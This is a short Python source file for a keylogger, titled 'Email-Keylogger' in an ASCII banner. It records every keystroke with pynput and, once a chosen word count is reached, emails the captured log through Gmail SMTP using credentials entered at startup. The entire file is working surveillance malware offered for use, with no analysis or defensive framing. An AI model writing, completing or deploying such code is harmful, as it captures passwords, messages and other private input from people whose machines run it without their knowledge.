

# keystroke listener module
from pynput.keyboard import Listener, Key

# sending emails modules
import smtplib, ssl

from string import ascii_letters

print('''
 /$$$$$$$$                         /$$ /$$         /$$   /$$                     /$$                                                  
| $$_____/                        |__/| $$        | $$  /$$/                    | $$                                                  
| $$       /$$$$$$/$$$$   /$$$$$$  /$$| $$        | $$ /$$/   /$$$$$$  /$$   /$$| $$  /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ 
| $$$$$   | $$_  $$_  $$ |____  $$| $$| $$ /$$$$$$| $$$$$/   /$$__  $$| $$  | $$| $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$
| $$__/   | $$ \ $$ \ $$  /$$$$$$$| $$| $$|______/| $$  $$  | $$$$$$$$| $$  | $$| $$| $$  \ $$| $$  \ $$| $$  \ $$| $$$$$$$$| $$  \__/
| $$      | $$ | $$ | $$ /$$__  $$| $$| $$        | $$\  $$ | $$_____/| $$  | $$| $$| $$  | $$| $$  | $$| $$  | $$| $$_____/| $$      
| $$$$$$$$| $$ | $$ | $$|  $$$$$$$| $$| $$        | $$ \  $$|  $$$$$$$|  $$$$$$$| $$|  $$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$$| $$      
|________/|__/ |__/ |__/ \_______/|__/|__/        |__/  \__/ \_______/ \____  $$|__/ \______/  \____  $$ \____  $$ \_______/|__/      
                                                                       /$$  | $$               /$$  \ $$ /$$  \ $$                    
                                                                      |  $$$$$$/              |  $$$$$$/|  $$$$$$/                    
                                                                       \______/                \______/  \______/                     
                                                                                        
''')

numLet = [i for i in ascii_letters] + [1,2,3,4,5,6,7,8,9,0]

Email = input("What Is Your Email: ")
password = input("What Is Your Password (Don't Worry We're Not Stealing It): ")

log = ' '
keyLog = ""

char_length = int(input("What Would You Like The Word Limit To Be Before The Email Is Sent: "))

def sendMail(email,password, msg):
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as server:
            server.login(email, password)
            server.sendmail(email,email,msg)
    except:
        print("\n Something Went Wrong Check To See Whether Your Email Or Password is Right")


def keystroke(key):
    # removes the comma in each keystroke recorded
    key = str(key).replace("'", "")

    global log
    global keyLog
    global char_length

    #Keystrokes message sender
    if key not in numLet:
        log+= '\n\n' f" {keyLog} \n {key} "   #'\n\n' works to ensure that the keystrokes show up as the message
        keyLog = ""
        if len(log.split()) >= (char_length):
            sendMail(Email, password, log)
            log = ""
    elif key in numLet:
        keyLog += key


# Listener to record each keystroke
with Listener(on_press=keystroke) as Listener:
    Listener.join()



input()